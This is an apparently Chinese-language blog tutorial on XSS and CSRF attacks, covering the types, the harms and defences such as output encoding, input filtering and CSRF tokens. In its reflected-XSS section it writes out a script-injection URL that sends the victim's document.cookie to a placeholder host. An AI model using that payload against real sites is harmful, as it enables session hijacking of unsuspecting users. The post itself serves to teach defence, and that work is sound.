---
title: 了解XSS/CSRF
categories: 安全
tags:
  - XSS
  - CSRF
  - 安全
date: 2017-06-06 13:21:15
updated: 2017-06-06 13:21:15
---

## XSS攻击和防御
### XSS定义
跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。
恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。

### XSS攻击方式
#### 反射型
发出请求时，XSS代码出现在URL中（典型的特征：攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程像一次反射，故叫反射型XSS，也叫作"非持久型XSS“(Non-persistent XSS)
![反射XSS](./reflect_xss.png)

1. 做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。
2. 在搜索框搜索内容，填入“<script>alert('handsome boy')</script>”, 点击搜索。
3. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。
4. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：
http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie
='+document.cookie</script>

#### 存储型
把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。
比较常见的一个场景：黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做"存储型XSS"。
#### DOM based XSS
也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS

### XSS的危害
这些危害包括但不局限于：
盗取管理员或普通用户cookie、session；
读取、篡改、添加、删除敏感数据;
网站挂马；
非法转账；
控制受害者机器向其它网站发起攻击 等等

### XSS防御措施
- 编码：不能对用户所有输入保持原样对用户输入的数据写入HTML文档
  [HTML实体编码规则](http://www.w3school.com.cn/tags/html_ref_entities.html)
  避免直接对HTML Entity解码
  使用DOM Parse转换，校正不匹配对的DOM标签
- 过滤：把输入不合法的过滤掉，保持安全性
  移除用户上传的DOM属性，如onerror，onclick等
  移除用户上传的Style节点，script节点，iframe节点等
  在表单提交或者url参数传递前，对需要的参数进行过滤,XSS过滤工具类代码过滤用户输入的 检查用户输入的内容中是否有非法内容。如<>（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。、严格控制输出


## CSRF攻击和防御

参考链接：[CSRF 详解与攻防实战](https://segmentfault.com/a/1190000006963312)

CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。

http请求是无状态的，也就是说每次http请求都是独立的无关之前的操作的，但是每次http请求都会将本域下的所有cookie作为http请求头的一部分发送给服务端，所以服务端就根据请求中的cookie存放的sessionid去session对象中找到该用户资料了。

CSRF攻击的主要目的是让用户在不知情的情况下攻击自己已登录的一个系统，类似于钓鱼。如用户当前已经登录了邮箱，或bbs，同时用户又在使用另外一个，已经被你控制的站点，我们姑且叫它钓鱼网站。这个网站上面可能因为某个图片吸引你，你去点击一下，此时可能就会触发一个js的点击事件，构造一个bbs发帖的请求，去往你的bbs发帖，由于当前你的浏览器状态已经是登陆状态，所以session登陆cookie信息都会跟正常的请求一样，纯天然的利用当前的登陆状态，让用户在不知情的情况下，帮你发帖或干其他事情。

### CSRF防御
通过 referer、token 或者 验证码 来检测用户提交。
尽量不要在页面的链接中暴露用户隐私信息。
对于用户修改删除等操作最好都使用post操作 。
避免全站通用的cookie，严格设置cookie的域。
